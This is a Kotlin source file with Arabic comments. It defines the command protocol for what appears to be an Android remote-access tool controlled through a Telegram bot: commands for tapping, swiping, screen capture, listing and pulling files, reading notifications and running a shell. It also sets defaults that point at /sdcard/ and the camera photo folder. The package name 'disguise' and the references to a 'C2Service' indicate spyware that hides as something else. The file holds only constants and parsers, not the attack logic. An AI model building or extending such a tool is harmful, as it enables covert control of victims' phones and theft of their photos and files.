package com.example.disguise.core

/**
 * Protocol.kt — تعريفات ثابتة للبروتوكول المشترك.
 *
 * ملاحظة: بعد الانتقال إلى Telegram Bot API، لم نعد بحاجة إلى
 * WebSocket ولا إلى JSON معقد. الأوامر نصية بسيطة، لكن هذا الملف
 * يبقى كمرجع مركزي للثوابت المستخدمة في CommandHandler و C2Service
 * و TelegramController، حتى لا تتفرق القيم في عدة ملفات.
 *
 * لا يحتوي هذا الملف على منطق — فقط ثوابت ودوال مساعدة صغيرة.
 */
object Protocol {

    // ============ بادئات الأوامر (كما تُرسل من تيليجرام) ============
    const val CMD_HELP = "help"
    const val CMD_TAP = "tap"
    const val CMD_SWIPE = "swipe"
    const val CMD_TEXT = "text"
    const val CMD_SCREEN = "screen"
    const val CMD_LS = "ls"
    const val CMD_PULL = "pull"
    const val CMD_BACK = "back"
    const val CMD_HOME = "home"
    const val CMD_RECENTS = "recents"
    const val CMD_NOTIF = "notif"
    const val CMD_SHELL = "shell"

    // ============ إعدادات Telegram ============
    /** الحد الأقصى لطول رسالة تيليجرام الواحدة */
    const val TG_MAX_MESSAGE_LEN = 4096

    /** حد حجم الصورة في sendPhoto (بايت) */
    const val TG_MAX_PHOTO_BYTES = 10L * 1024 * 1024

    /** حد حجم الملف في sendDocument (بايت) */
    const val TG_MAX_DOC_BYTES = 50L * 1024 * 1024

    /** مهلة Long Polling بالثواني */
    const val TG_LONG_POLL_TIMEOUT = 30

    // ============ إعدادات الخدمة ============
    /** فاصل التراجع الأسّي الأولي عند فشل الشبكة (ms) */
    const val POLL_BACKOFF_INITIAL_MS = 1_000L

    /** الحد الأقصى للتراجع الأسّي (ms) */
    const val POLL_BACKOFF_MAX_MS = 60_000L

    /** مدة مهلة اتصال OkHttp (ثانية) */
    const val HTTP_CONNECT_TIMEOUT_SEC = 15L

    /** مدة مهلة قراءة OkHttp (ثانية) */
    const val HTTP_READ_TIMEOUT_SEC = 40L

    /** مدة مهلة كتابة OkHttp (ثانية) — رفع الملفات */
    const val HTTP_WRITE_TIMEOUT_SEC = 120L

    // ============ مسارات افتراضية ============
    /** المسار الافتراضي لأمر /ls */
    const val DEFAULT_LS_PATH = "/sdcard/"

    /** المسار الافتراضي للصور (للأوامر السريعة) */
    const val DEFAULT_PHOTO_PATH = "/sdcard/DCIM/Camera/"

    // ============ دوال مساعدة ============

    /**
     * تحليل أمر نصي إلى (cmd, args).
     * مثال: "/tap 500 1000" -> ("tap", "500 1000")
     *       "help" -> ("help", "")
     */
    fun parse(raw: String): Pair<String, String> {
        val trimmed = raw.trim().removePrefix("/")
        if (trimmed.isEmpty()) return "" to ""
        val parts = trimmed.split(" ", limit = 2)
        val cmd = parts[0].lowercase()
        val args = if (parts.size > 1) parts[1].trim() else ""
        return cmd to args
    }

    /**
     * تحليل إحداثيات "X Y" إلى (Float, Float).
     * يعيد null إذا كانت الصيغة غير صحيحة.
     */
    fun parseXY(args: String): Pair<Float, Float>? {
        val parts = args.split(" ").filter { it.isNotBlank() }
        if (parts.size < 2) return null
        val x = parts[0].toFloatOrNull() ?: return null
        val y = parts[1].toFloatOrNull() ?: return null
        return x to y
    }

    /**
     * تحليل إحداثيات السحب "X1 Y1 X2 Y2 [MS]".
     * يعيد null إذا كانت الصيغة غير صحيحة.
     */
    fun parseSwipe(args: String): SwipeParams? {
        val parts = args.split(" ").filter { it.isNotBlank() }
        if (parts.size < 4) return null
        val x1 = parts[0].toFloatOrNull() ?: return null
        val y1 = parts[1].toFloatOrNull() ?: return null
        val x2 = parts[2].toFloatOrNull() ?: return null
        val y2 = parts[3].toFloatOrNull() ?: return null
        val ms = if (parts.size >= 5) parts[4].toLongOrNull() ?: 300L else 300L
        return SwipeParams(x1, y1, x2, y2, ms)
    }
}

/**
 * بيانات سحب (Swipe).
 */
data class SwipeParams(
    val x1: Float,
    val y1: Float,
    val x2: Float,
    val y2: Float,
    val durationMs: Long = 300L
)